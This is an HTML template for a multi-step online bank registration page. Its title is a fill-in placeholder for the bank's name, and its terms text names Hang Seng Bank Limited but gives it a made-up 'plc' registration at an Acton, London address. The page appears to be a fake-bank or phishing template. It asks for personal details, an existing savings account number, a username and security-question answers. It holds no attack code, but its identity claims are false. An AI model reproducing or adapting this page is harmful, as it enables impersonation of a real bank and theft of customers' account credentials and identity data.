<!doctype html>
<html lang="en">
<head>
      <!-- Required meta tags -->
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <title>{{ $bankName }}</title>
      <!-- Favicon -->
      <link rel="shortcut icon" href="images/favicon.ico" />
      <!-- Bootstrap CSS -->
      <link rel="stylesheet" href="css/bootstrap.min.css">
      <!-- Typography CSS -->
      <link rel="stylesheet" href="css/typography.css">
      <!-- Style CSS -->
      <link rel="stylesheet" href="css/style.css">
      <!-- Responsive CSS -->
      <link rel="stylesheet" href="css/responsive.css">
      <link href="https://code.jquery.com/ui/1.9.0/themes/ui-darkness/jquery-ui.css" rel="stylesheet">
      <link href="css/keyboard.css" rel="stylesheet">
      <style type="text/css">
          .ui-widget-content {
    border: 1px solid var(--iq-border-light);
    background: #fff !important;
    color: #1e3d73;
}
.online-support{margin-top: 10px;}
.online-support h3{background: #fe517e;color: #fff; padding-left: 15px;margin-bottom: 10px;border:1px solid transparent;box-shadow: 0px 2px 5px 2px rgba(0,0,0,0.1)}
.online-support .btn-link{color:#fff;border-bottom: 1px solid #fff;border-radius: 0px;}
.input-group-text{font-size: 20px;}
      </style>
   </head>
   <body>
      <!-- loader Start -->
      <div id="loading">
         <div id="loading-center">
         </div>
      </div>
      <!-- loader END -->
        <!-- Sign in Start -->
        <section class="sign-in-page py-5">
            <div class="container p-0 ">
                <div class="row no-gutters height-self-center">
                  <div class="col-sm-12 align-self-center bg-[#b34020] rounded mb-5">
                    <div class="row m-0 ">
                      <div class="col-md-8 bg-white sign-in-page-data iq-card pb-0 mb-0">
                          <div class="sign-in-from">
                           <div class="p-lg border-b border-outline-variant/30 flex justify-between items-center">
                              <h3 class="mb-0 text-left">Bank Account Registration</h3>
                           </div>
                              
                               <div class="flex flex-wrap -mx-3">
                               <div class="col-12 text-dark">
                               <form id="form-wizard1" class="text-center mt-6 bggray-cus">
                                <!-- fieldsets -->
                               <fieldset>
                                 <div class="form-card text-left">
                                    <div class="flex flex-wrap -mx-3">
                                       <div class="col-7">
                                          <h5 class="mb-6">Terms and conditions:</h5>
                                       </div>
                                       <div class="col-5">
                                          <h4 class="steps">Step 1 - 4</h4>
                                       </div>
                                       <div class="col-12">
                                          <textarea name="terms" rows="10" readonly="readonly" cols="45" autocomplete="off" style="height:250px;width:100%;">  HANG SENG BANK LIMITED ONLINE TERMS AND CONDITIONS 

                                          VIEW ONLINE CONDITIONS.

                                          Before you can start using our online service you must agree to be bound by the conditions below.  You must read the conditions before you decide whether to accept them.  If you agree to be bound by these conditions, please click the I accept button below.  If you click on the Decline button, you will not be able to continue your registration for our online services. We strongly recommend that you print a copy of these conditions for your reference.

                                          1. DEFINITIONS.
                                          In these conditions the following words have the following meanings.

                                          - ACCOUNT  any account which you hold and access via our online service.

                                          - ADDITIONAL SECURITY DETAILS  the additional information you give us to help us identify you including the additional security question you provide yourself.

                                          - IDENTITY DETAILS  the access code we may provide you with.

                                          - PASSWORD and USERNAME  the password and name you choose to identify yourself when you use our online service.

                                          - WE, US and OUR  mean Hang Seng Bank Limited plc, registered address 3A Berrymead Gardens, Acton, London, W3 8AA United Kingdom.Company No: IP00486C.

                                          - YOU, YOUR and YOURSELF  refer to the person who has entered into this agreement with us.

                                          2. USING THE ONLINE SERVICE.

                                          a. These conditions apply to your use of our online service and in relation to any accounts.  They explain the relationship between you and us in relation to our online service.  You should read these conditions carefully to understand how these services work and your and our rights and duties under them.  If there is a conflict between these conditions and your account conditions, these conditions will apply.  This means that, when you use our online service both sets of conditions will apply unless they contradict each other in which case, the relevant condition in these conditions apply.

                                          b. If any of your accounts is a joint account, these conditions apply to all of you together and any of you separately.  If more than one of you uses our online service you must each choose your own username, password and additional security details.

                                          c. By registering to use our online service, you accept these conditions and agree that we may communicate with you by e-mail or through our website.

                                          d. When you use our online service you must follow the instructions we give you from time to time.  You are responsible for ensuring that your computer, software and other equipment are capable of being used with our online service.

                                          e. Our online sites are secure.  Disconnection from the Internet or leaving these sites will not automatically log you off.  You must always use the log off facility when you are finished and never leave your machine unattended while you are logged in.  As a security measure, if you have not used the sites for more than a specified period of time we will ask you to log in again. 

                                          3. WHAT RULES APPLY TO SECURITY?

                                          a. As part of the registration for our online service you must provide us with identity details before we will allow you to use the services for the first time.  You must enter your identity details immediately after signing in, so we can identify you.

                                          b. Every time you use our online service you must give us your username, your password and the answer to an additional security question.

                                          c. You can change your username or password online by following the instructions on the screen.  

                                          d. For administration or security reasons, we can require you to choose a new username or change your password before you use (or carry on using) our online service.

                                          e. You must not write down, store (whether encrypted or otherwise) on your computer or let anyone else know your password, identity details or additional security details, and the fact that they are for use with your accounts.

                                          </textarea>
                                       </div>
                                    </div>
                                 </div>
                                
                                 <button type="button" name="next" class="btn btn-primary next action-button float-right" value="Next">Continue</button>
                                  <button type="button"  data-toggle="modal" data-target="#resumeotp" class="btn btn-success mr-3 float-right" >Resume Registration</button>
                               </fieldset>
                              <!-- fieldsets -->
                               <fieldset>
                                 <div class="form-card text-left">
                                    <div class="flex flex-wrap -mx-3">
                                       <div class="col-7">
                                          <h5 class="mb-6">Personal Information:</h5>
                                       </div>
                                       <div class="col-5">
                                          <h4 class="steps">Step 2 - 4</h4>
                                       </div>
                                    </div>
                                    <div class="flex flex-wrap -mx-3">
                                       <p class="text-left text-error col-md-12">*Remember you can resume the application if you stop mid way and wants to continue. </p>
                                       <div class="clearfix"></div>
                                       <div class="col-12">
                                          <div class="mb-6">
                                             <label class="block text-sm font-semibold text-on-surface-variant mb-2">Account Type</label>
                                             <select type="text" class="bg-surface-container-low border border-transparent rounded-lg py-3 px-4 w-full text-on-surface font-body-md focus:border-primary focus:ring-1 focus:ring-primary outline-none transition-all">
                                                <option>--select--</option>
                                                <option>Personal</option>
                                                <option>Corporate</option>
                                             </select>
                                          </div>
                                       </div>
                                       <div class="col-12">
                                          <div class="mb-6">
                                             <label class="block text-sm font-semibold text-on-surface-variant mb-2">Title</label>
                                             <input type="text" class="bg-surface-container-low border border-transparent rounded-lg py-3 px-4 w-full text-on-surface font-body-md focus:border-primary focus:ring-1 focus:ring-primary outline-none transition-all">
                                          </div>
                                       </div>
                                     
                                        <div class="col-12">
                                          <div class="mb-6">
                                             <label class="block text-sm font-semibold text-on-surface-variant mb-2">First Name</label>
                                             <input type="text" class="bg-surface-container-low border border-transparent rounded-lg py-3 px-4 w-full text-on-surface font-body-md focus:border-primary focus:ring-1 focus:ring-primary outline-none transition-all">
                                          </div>
                                       </div>
                                       <div class="col-12">
                                          <div class="mb-6">
                                             <label class="block text-sm font-semibold text-on-surface-variant mb-2">Middle Name (Optional)</label>
                                             <input type="text" class="bg-surface-container-low border border-transparent rounded-lg py-3 px-4 w-full text-on-surface font-body-md focus:border-primary focus:ring-1 focus:ring-primary outline-none transition-all">
                                          </div>
                                       </div>
                                       <div class="col-12">
                                          <div class="mb-6">
                                             <label class="block text-sm font-semibold text-on-surface-variant mb-2">Surname</label>
                                             <input type="text" class="bg-surface-container-low border border-transparent rounded-lg py-3 px-4 w-full text-on-surface font-body-md focus:border-primary focus:ring-1 focus:ring-primary outline-none transition-all">
                                          </div>
                                       </div>
                                         <div class="col-12">
                                          <div class="mb-6">
                                             <label class="block text-sm font-semibold text-on-surface-variant mb-2">Date Of Birth</label>
                                             <input type="Date" class="bg-surface-container-low border border-transparent rounded-lg py-3 px-4 w-full text-on-surface font-body-md focus:border-primary focus:ring-1 focus:ring-primary outline-none transition-all">
                                          </div>
                                       </div>
                                       <div class="col-12">
                                          <div class="mb-6">
                                             <label class="block text-sm font-semibold text-on-surface-variant mb-2">Contact No.</label>
                                             <input type="text" class="bg-surface-container-low border border-transparent rounded-lg py-3 px-4 w-full text-on-surface font-body-md focus:border-primary focus:ring-1 focus:ring-primary outline-none transition-all">
                                          </div>
                                       </div>
                                       <div class="col-12">
                                          <div class="mb-6">
                                             <label class="block text-sm font-semibold text-on-surface-variant mb-2">Email Address</label>
                                             <input type="text" class="bg-surface-container-low border border-transparent rounded-lg py-3 px-4 w-full text-on-surface font-body-md focus:border-primary focus:ring-1 focus:ring-primary outline-none transition-all">
                                          </div>
                                       </div>
                                        <div class="col-12">
                                          <div class="mb-6">
                                             <label class="block text-sm font-semibold text-on-surface-variant mb-2">Address</label>
                                             <input type="text" class="bg-surface-container-low border border-transparent rounded-lg py-3 px-4 w-full text-on-surface font-body-md focus:border-primary focus:ring-1 focus:ring-primary outline-none transition-all">
                                          </div>
                                       </div>
                                       <div class="col-12">
                                          <div class="mb-6">
                                             <label class="block text-sm font-semibold text-on-surface-variant mb-2">Postcode</label>
                                             <input type="text" class="bg-surface-container-low border border-transparent rounded-lg py-3 px-4 w-full text-on-surface font-body-md focus:border-primary focus:ring-1 focus:ring-primary outline-none transition-all">
                                          </div>
                                       </div>
                                       <div class="col-12">
                                          <div class="mb-6">
                                             <label class="block text-sm font-semibold text-on-surface-variant mb-2">Country</label>
                                             <select name="country" class="bg-surface-container-low border border-transparent rounded-lg py-3 px-4 w-full text-on-surface font-body-md focus:border-primary focus:ring-1 focus:ring-primary outline-none transition-all">
                                                <option selected="selected" value="">Please Select</option>
                                                <option value="Afghanistan">Afghanistan</option>
                                                <option value="Albania ">Albania</option>
                                                <option value="Algeria">Algeria</option>
                                                <option value="American Samoa">American Samoa</option>
                                                <option value="Andorra">Andorra</option>
                                                <option value="Angola">Angola</option>
                                                <option value="Anguilla">Anguilla</option>
                                                <option value="Antarctica">Antarctica</option>
                                                <option value="Antigua and Barbuda">Antigua and Barbuda</option>
                                                <option value="Argentina ">Argentina</option>
                                                <option value="Armenia">Armenia</option>
                                                <option value="Aruba">Aruba</option>
                                                <option value="Australia">Australia</option>
                                                <option value="Austria">Austria</option>
                                                <option value="Azerbaijan">Azerbaijan</option>
                                                <option value="Bahamas">Bahamas</option>
                                                <option value="Bahrain">Bahrain</option>
                                                <option value="Bangladesh">Bangladesh</option>
                                                <option value="Barbados">Barbados</option>
                                                <option value="Belarus">Belarus</option>
                                                <option value="Belgium">Belgium</option>
                                                <option value="Belize">Belize</option>
                                                <option value="Benin">Benin</option>
                                                <option value="Bermuda">Bermuda</option>
                                                <option value="Bhutan">Bhutan</option>
                                                <option value="Bolivia">Bolivia</option>
                                                <option value="Bosnia and Herzegowina">Bosnia and Herzegowina</option>
                                                <option value="Botswana">Botswana</option>
                                                <option value="Bouvet Island">Bouvet Island</option>
                                                <option value="Brazil">Brazil</option>
                                                <option value="British Indian Ocean Territory">British Indian Ocean Territory</option>
                                                <option value="Brunei Darussalam">Brunei Darussalam</option>
                                                <option value="Bulgaria">Bulgaria</option>
                                                <option value="Burundi">Burundi</option>
                                                <option value="Cambodia">Cambodia</option>
                                                <option value="Cameroon">Cameroon</option>
                                                <option value="Canada">Canada</option>
                                                <option value="Cape Verde">Cape Verde</option>
                                                <option value="Cayman Islands">Cayman Islands</option>
                                                <option value="Central African Republic">Central African Republic</option>
                                                <option value="Chad">Chad</option>
                                                <option value="Chile">Chile</option>
                                                <option value="China">China</option>
                                                <option value="Christmas Island">Christmas Island</option>
                                                <option value="Cocos (Keeling) Islands">Cocos (Keeling) Islands</option>
                                                <option value="Colombia">Colombia</option>
                                                <option value="Comoros">Comoros</option>
                                                <option value="Congo">Congo</option>
                                                <option value="Cook Islands">Cook Islands</option>
                                                <option value="Costa Rica">Costa Rica</option>
                                                <option value="Cote D'Ivoire">Cote D'Ivoire</option>
                                                <option value="Croatia">Croatia</option>
                                                <option value="Cuba">Cuba</option>
                                                <option value="Cyprus">Cyprus</option>
                                                <option value="Czech Republic">Czech Republic</option>
                                                <option value="Denmark">Denmark</option>
                                                <option value="Djibouti">Djibouti</option>
                                                <option value="Dominica">Dominica</option>
                                                <option value="Dominican Republic">Dominican Republic</option>
                                                <option value="East Timor">East Timor</option>
                                                <option value="Ecuador">Ecuador</option>
                                                <option value="Egypt">Egypt</option>
                                                <option value="El Salvador">El Salvador</option>
                                                <option value="Equatorial Guinea">Equatorial Guinea</option>
                                                <option value="Eritrea">Eritrea</option>
                                                <option value="Estonia">Estonia</option>
                                                <option value="Ethiopia">Ethiopia</option>
                                                <option value="Falkland Islands">Falkland Islands</option>
                                                <option value="Faroe Islands">Faroe Islands</option>
                                                <option value="Fiji">Fiji</option>
                                                <option value="Finland">Finland</option>
                                                <option value="France">France</option>
                                                <option value="France (Metropolitan)">France (Metropolitan)</option>
                                                <option value="French Guiana">French Guiana</option>
                                                <option value="French Polynesia">French Polynesia</option>
                                                <option value="French Southern Territories">French Southern Territories</option>
                                                <option value="Gabon">Gabon</option>
                                                <option value="Gambia">Gambia</option>
                                                <option value="Georgia">Georgia</option>
                                                <option value="Germany">Germany</option>
                                                <option value="Ghana">Ghana</option>
                                                <option value="Gibraltar">Gibraltar</option>
                                                <option value="Greece">Greece</option>
                                                <option value="Greenland">Greenland</option>
                                                <option value="Grenada">Grenada</option>
                                                <option value="Guadeloupe">Guadeloupe</option>
                                                <option value="Guam">Guam</option>
                                                <option value="Guatemala">Guatemala</option>
                                                <option value="Guinea">Guinea</option>
                                                <option value="Guinea-Bissau">Guinea-Bissau</option>
                                                <option value="Guyana">Guyana</option>
                                                <option value="Haiti">Haiti</option>
                                                <option value="Heard and McDonald Islands">Heard and McDonald Islands</option>
                                                <option value="Honduras">Honduras</option>
                                                <option value="Hong Kong">Hong Kong</option>
                                                <option value="Hungary">Hungary</option>
                                                <option value="Iceland">Iceland</option>
                                                <option value="India">India</option>
                                                <option value="Indonesia">Indonesia</option>
                                                <option value="Iran">Iran</option>
                                                <option value="Iraq">Iraq</option>
                                                <option value="Ireland">Ireland</option>
                                                <option value="Israel">Israel</option>
                                                <option value="Italy">Italy</option>
                                                <option value="Jamaica">Jamaica</option>
                                                <option value="Japan">Japan</option>
                                                <option value="Jordan">Jordan</option>
                                                <option value="Kazakhstan">Kazakhstan</option>
                                                <option value="Kenya">Kenya</option>
                                                <option value="Kiribati">Kiribati</option>
                                                <option value="Korea (Democratic People's Republic of)">Korea (Democratic People's Republic of)</option>
                                                <option value="Korea (Republic of)">Korea (Republic of)</option>
                                                <option value="Kuwait">Kuwait</option>
                                                <option value="Kyrgyzstan">Kyrgyzstan</option>
                                                <option value="Lao People's Democratic Republic">Lao People's Democratic Republic</option>
                                                <option value="Latvia">Latvia</option>
                                                <option value="Lebanon">Lebanon</option>
                                                <option value="Lesotho">Lesotho</option>
                                                <option value="Liberia">Liberia</option>
                                                <option value="Libyan Arab Jamahiriya">Libyan Arab Jamahiriya</option>
                                                <option value="Liechtenstein">Liechtenstein</option>
                                                <option value="Lithuania">Lithuania</option>
                                                <option value="Luxembourg">Luxembourg</option>
                                                <option value="Macau">Macau</option>
                                                <option value="Macedonia">Macedonia (The Former Yugoslav Republic of)</option>
                                                <option value="Madagascar">Madagascar</option>
                                                <option value="Malawi">Malawi</option>
                                                <option value="Malaysia">Malaysia</option>
                                                <option value="Maldives">Maldives</option>
                                                <option value="Mali">Mali</option>
                                                <option value="Malta">Malta</option>
                                                <option value="Marshall Islands">Marshall Islands</option>
                                                <option value="Martinique">Martinique</option>
                                                <option value="Mauritania">Mauritania</option>
                                                <option value="Mauritius">Mauritius</option>
                                                <option value="Mayotte">Mayotte</option>
                                                <option value="Mexico">Mexico</option>
                                                <option value="Micronesia (Federated States of)">Micronesia (Federated States of)</option>
                                                <option value="Moldova (Republic of)">Moldova (Republic of)</option>
                                                <option value="Monaco">Monaco</option>
                                                <option value="Mongolia">Mongolia</option>
                                                <option value="Montserrat">Montserrat</option>
                                                <option value="Morocco">Morocco</option>
                                                <option value="Mozambique">Mozambique</option>
                                                <option value="Myanmar">Myanmar</option>
                                                <option value="Namibia">Namibia</option>
                                                <option value="Nauru">Nauru</option>
                                                <option value="Nepal">Nepal</option>
                                                <option value="Netherlands">Netherlands</option>
                                                <option value="Netherlands Antilles">Netherlands Antilles</option>
                                                <option value="New Caledonia">New Caledonia</option>
                                                <option value="New Zealand">New Zealand</option>
                                                <option value="Nicaragua">Nicaragua</option>
                                                <option value="Niger">Niger</option>
                                                <option value="Nigeria">Nigeria</option>
                                                <option value="Niue">Niue</option>
                                                <option value="Norfolk Island">Norfolk Island</option>
                                                <option value="Northern Mariana Islands">Northern Mariana Islands</option>
                                                <option value="Norway">Norway</option>
                                                <option value="Oman">Oman</option>
                                                <option value="Pakistan">Pakistan</option>
                                                <option value="Palau">Palau</option>
                                                <option value="Panama">Panama</option>
                                                <option value="Papua New Guinea">Papua New Guinea</option>
                                                <option value="Paraguay">Paraguay</option>
                                                <option value="Peru">Peru</option>
                                                <option value="Philippines">Philippines</option>
                                                <option value="Pitcairn">Pitcairn</option>
                                                <option value="Poland">Poland</option>
                                                <option value="Portugal">Portugal</option>
                                                <option value="Puerto Rico">Puerto Rico</option>
                                                <option value="Qatar">Qatar</option>
                                                <option value="Reunion">Reunion</option>
                                                <option value="Romania">Romania</option>
                                                <option value="Russian Federation">Russian Federation</option>
                                                <option value="Rwanda">Rwanda</option>
                                                <option value="Saint Kitts and Nevis">Saint Kitts and Nevis</option>
                                                <option value="Saint Lucia">Saint Lucia</option>
                                                <option value="Saint Vincent and the Grenadines">Saint Vincent and the Grenadines</option>
                                                <option value="Samoa">Samoa</option>
                                                <option value="San Marino">San Marino</option>
                                                <option value="Sao Tome and Principe">Sao Tome and Principe</option>
                                                <option value="Saudi Arabia">Saudi Arabia</option>
                                                <option value="Sebia">Sebia</option>
                                                <option value="Senegal">Senegal</option>
                                                <option value="Seychelles">Seychelles</option>
                                                <option value="Sierra Leone">Sierra Leone</option>
                                                <option value="Singapore">Singapore</option>
                                                <option value="Slovakia (Slovak Republic)">Slovakia (Slovak Republic)</option>
                                                <option value="Slovenia">Slovenia</option>
                                                <option value="Solomon Islands">Solomon Islands</option>
                                                <option value="Somalia">Somalia</option>
                                                <option value="South Africa">South Africa</option>
                                                <option value="South Georgia &amp; South Sandwich Islands">South Georgia and the South Sandwich Islands</option>
                                                <option value="Spain">Spain</option>
                                                <option value="Sri Lanka">Sri Lanka</option>
                                                <option value="St. Helena">St. Helena</option>
                                                <option value="St. Pierre and Miquelon">St. Pierre and Miquelon</option>
                                                <option value="Sudan">Sudan</option>
                                                <option value="Suriname">Suriname</option>
                                                <option value="Svalbard and Jan Mayen Islands">Svalbard and Jan Mayen Islands</option>
                                                <option value="Swaziland">Swaziland</option>
                                                <option value="Sweden">Sweden</option>
                                                <option value="Switzerland">Switzerland</option>
                                                <option value="Syrian Arab Republic">Syrian Arab Republic</option>
                                                <option value="Taiwan (Province of China)">Taiwan (Province of China)</option>
                                                <option value="Tajikistan">Tajikistan</option>
                                                <option value="Tanzania (United Republic of)">Tanzania (United Republic of)</option>
                                                <option value="Thailand">Thailand</option>
                                                <option value="Togo">Togo</option>
                                                <option value="Tokelau">Tokelau</option>
                                                <option value="Tonga">Tonga</option>
                                                <option value="Trinidad and Tobago">Trinidad and Tobago</option>
                                                <option value="Tunisia">Tunisia</option>
                                                <option value="Turkey">Turkey</option>
                                                <option value="Turkmenistan">Turkmenistan</option>
                                                <option value="Turks and Caicos Islands">Turks and Caicos Islands</option>
                                                <option value="Tuvalu">Tuvalu</option>
                                                <option value="Uganda">Uganda</option>
                                                <option value="Ukraine">Ukraine</option>
                                                <option value="United Arab Emirates">United Arab Emirates</option>
                                                <option value="United Kingdom">United Kingdom</option>
                                                <option value="United States Minor Outlying Islands">United States Minor Outlying Islands</option>
                                                <option value="United States of America">United States of America</option>
                                                <option value="Uruguay">Uruguay</option>
                                                <option value="Uzbekistan">Uzbekistan</option>
                                                <option value="Vanuatu">Vanuatu</option>
                                                <option value="Vatican City State (Holy See)">Vatican City State (Holy See)</option>
                                                <option value="Venezuela">Venezuela</option>
                                                <option value="Viet Nam">Viet Nam</option>
                                                <option value="Virgin Islands (British)">Virgin Islands (British)</option>
                                                <option value="Virgin Islands (U.S.)">Virgin Islands (U.S.)</option>
                                                <option value="Wallis and Futuna Islands">Wallis and Futuna Islands</option>
                                                <option value="Western Sahara">Western Sahara</option>
                                                <option value="Yemen">Yemen</option>
                                                <option value="Yugoslavia">Yugoslavia</option>
                                                <option value="Zaire">Zaire</option>
                                                <option value="Zambia">Zambia</option>
                                                <option value="Zimbabwe">Zimbabwe</option>
                                              </select>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                                 <button type="button" name="next" class="btn btn-primary next action-button float-right" value="Next">Continue</button>
                              </fieldset>
                              <fieldset>
                                 <div class="form-card text-left">
                                    <div class="flex flex-wrap -mx-3">
                                       <div class="col-7">
                                          <h5 class="mb-6">Access and Security</h5>
                                       </div>
                                       <div class="col-5">
                                          <h2 class="steps">Step 3 - 4</h2>
                                       </div>
                                    </div>
                                    <div class="flex flex-wrap -mx-3">
                                       <div class="col-md-12">
                                          <p class="text-error">Please enter your existing Hang Seng Bank Limited Savings account number</p>
                                          <div class="mb-6">
                                             <label class="block text-sm font-semibold text-on-surface-variant mb-2">Account number</label>
                                             <input type="text" class="bg-surface-container-low border border-transparent rounded-lg py-3 px-4 w-full text-on-surface font-body-md focus:border-primary focus:ring-1 focus:ring-primary outline-none transition-all" >
                                          </div>
                                       </div>
                                       <div class="col-md-12">
                                          <p class="text-error">Choose a login username</p>
                                          <div class="mb-6">
                                             <label class="block text-sm font-semibold text-on-surface-variant mb-2">Username: *</label>
                                             <input type="text" class="bg-surface-container-low border border-transparent rounded-lg py-3 px-4 w-full text-on-surface font-body-md focus:border-primary focus:ring-1 focus:ring-primary outline-none transition-all" >
                                          </div>
                                       </div>
                                       <div class="col-md-12">
                                          <p class="text-error">Account security questions. (You may change the questions to something memorable)</p>
                                          <div class="mb-6">
                                             <label class="block text-sm font-semibold text-on-surface-variant mb-2">Question 1</label>
                                             <div class="alert text-white bg-[#b34020] py-1" role="alert">
                                                <div class="iq-alert-text">What is the name of your best actor ?</div>
                                             </div>
                                             <input type="text" class="bg-surface-container-low border border-transparent rounded-lg py-3 px-4 w-full text-on-surface font-body-md focus:border-primary focus:ring-1 focus:ring-primary outline-none transition-all" placeholder="Answer">
                                          </div>

                                          <div class="mb-6">
                                             <label class="block text-sm font-semibold text-on-surface-variant mb-2">Question 2</label>
                                             <div class="alert text-white bg-[#b34020] py-1" role="alert">
                                                <div class="iq-alert-text">What is your favorite book?</div>
                                             </div>
                                             <input type="text" class="bg-surface-container-low border border-transparent rounded-lg py-3 px-4 w-full text-on-surface font-body-md focus:border-primary focus:ring-1 focus:ring-primary outline-none transition-all" placeholder="Answer">
                                          </div>

                                          <div class="mb-6">
                                             <label class="block text-sm font-semibold text-on-surface-variant mb-2">Question 3</label>
                                             <div class="alert text-white bg-[#b34020] py-1" role="alert">
                                                <div class="iq-alert-text">What town was your mother born?</div>
                                             </div>
                                             <input type="text" class="bg-surface-container-low border border-transparent rounded-lg py-3 px-4 w-full text-on-surface font-body-md focus:border-primary focus:ring-1 focus:ring-primary outline-none transition-all" placeholder="Answer">
                                          </div>
                                       </div>
                                       
                                    </div>
                                 </div>

                                 <button type="button" name="next" class="btn btn-primary next action-button float-right" value="Next">Continue</button>

                                 <button type="button" name="previous" class="btn btn-dark previous action-button-previous float-right mr-3" value="Previous">Previous</button>
                              </fieldset>
                             
                              <fieldset>
                                 <div class="form-card text-left">
                                    <div class="flex flex-wrap -mx-3">
                                       <div class="col-7">
                                          <h3 class="mb-6">Success</h3>
                                       </div>
                                       <div class="col-5">
                                          <h2 class="steps">Step 4 - 4</h2>
                                       </div>
                                    </div>
                                    <div class="text-center">
                                       <img src="images/check.gif" class="success">
                                    </div>
                                   <!--  <div class="mb-6">
                                       <label class="block text-sm font-semibold text-on-surface-variant mb-2">Upload Your Photo:</label>
                                       <input type="file" class="bg-surface-container-low border border-transparent rounded-lg py-3 px-4 w-full text-on-surface font-body-md focus:border-primary focus:ring-1 focus:ring-primary outline-none transition-all" name="pic" accept="image/*">
                                    </div>
                                    <div class="mb-6">
                                       <label class="block text-sm font-semibold text-on-surface-variant mb-2">Upload Signature Photo:</label>
                                       <input type="file" class="bg-surface-container-low border border-transparent rounded-lg py-3 px-4 w-full text-on-surface font-body-md focus:border-primary focus:ring-1 focus:ring-primary outline-none transition-all" name="pic-2" accept="image/*">
                                    </div> -->
                                 </div>
                              </fieldset>
                                <!--  <button type="button"  class="btn btn-primary next action-button float-right" value="Submit">Submit</button> -->
                                 
                           </form>
                               </div>
                            </div>
                          </div>
                      </div>
                        <div class="col-sm-6 col-md-4 text-center sign-in-page-image order-md-3 pb-0">
                          <div class="sign-in-detail text-white pb-0">
                            <a class="sign-in-logo" href="#"><img src="images/logo-full.png" class="img-fluid" alt="logo"></a>
                            
                               <div class="online-support">
                                 <h3>Registration Area</h3> 
                                <a href="online-open-account" class="btn btn-danger my-2 d-block">Apply for Account Opening</a>
                                <a href="registration-new-internet-account" class="btn btn-danger mb-2 d-block" target="_blank">Apply for Internet Banking Option</a>
                                <a href="retrieve-accountpin" class="btn btn-danger d-block">Retrieve Account PIN</a>
                                <a href="retrieve-account-userid" class="btn btn-danger my-2 d-block"> Retrieve Account User ID</a> 
                                <img src="images/hpclinet.png" style="width:80%;margin:auto;" class="mt-5">
                              </div>
                          </div>
                      </div>
                    </div>
                  </div>
                </div>
            </div>
        </section>
        <!-- Sign in END -->
        
      <!-- Optional JavaScript -->
      <script src="js/jquery.min.js"></script>
      <script src="js/popper.min.js"></script>
      <script src="js/bootstrap.min.js"></script>
      <!-- Counterup JavaScript -->
      <script src="js/waypoints.min.js"></script>
      <script src="js/jquery.counterup.min.js"></script>
            <!-- Slick JavaScript -->
      <script src="js/slick.min.js"></script>
       <!-- Select2 JavaScript -->
      <script src="js/select2.min.js"></script>
      <!-- Wow JavaScript -->
      <script src="js/wow.min.js"></script>
      <!-- Owl Carousel JavaScript -->
      <script src="js/owl.carousel.min.js"></script>
      <script src="js/jquery.keyboard.js"></script>
      <script src="js/jquery.mousewheel.js"></script>
      <!-- <script src="js/jquery.keyboard.extension-caret.js"></script>
      <script src="js/jquery.keyboard.extension-typing.js"></script> -->
      <script src="https://code.jquery.com/ui/1.9.0/jquery-ui.min.js"></script>
      <!-- Magnific Popup JavaScript -->
      <script src="js/jquery.magnific-popup.min.js"></script>
      <script src="js/chart-custom.js"></script>
      <!-- Custom JavaScript -->
      <!--  <script type="text/javascript">
        $('#username,#password').keyboard({openOn : null });
        
        $('.username').click(function(){
          var kb = $('#username').getkeyboard();
          kb.reveal()
        })
        $('.password').click(function(){
          var kb = $('#password').getkeyboard();
          kb.reveal()
        })
      </script>-->
      <script src="js/custom.js"></script> 
      <script type="text/javascript">
        jQuery("#load").fadeOut();
        jQuery("#loading").delay().fadeOut("");
      </script>


      <div class="modal " id="resumeotp"  role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
          <div class="modal-content">
            <div class="modal-header">
              <!-- <h5 class="modal-title" id="exampleModalLabel">Modal title</h5> -->
              <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                <span aria-hidden="true">&times;</span>
              </button>
            </div>
            <div class="modal-body">
               <div class="form-card text-left">
                  <div class="flex flex-wrap -mx-3">
                     <div class="col-12">
                        <h4 class="text-center">Resume Registration</h4>
                        <p class="text-center">Enter the Registration Number from the previous process you started to resume that</p>
                        
                     </div>
                  </div>
                  <div class="row justify-content-center">
                     <div class="w-full md:w-1/2 px-3">
                        <div class="mb-6">
                           <!-- <label class="block text-sm font-semibold text-on-surface-variant mb-2">First Name: *</label> -->
                           <input type="text" class="bg-surface-container-low border border-transparent rounded-lg py-3 px-4 w-full text-on-surface font-body-md focus:border-primary focus:ring-1 focus:ring-primary outline-none transition-all" name="fname" placeholder="Enter registration no.">
                        </div>
                        <div class="text-center">
                          
                        <button type="button"  class="btn btn-success mt-2" >Submit</button>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
          </div>
        </div>
      </div>
   </body>
</html>
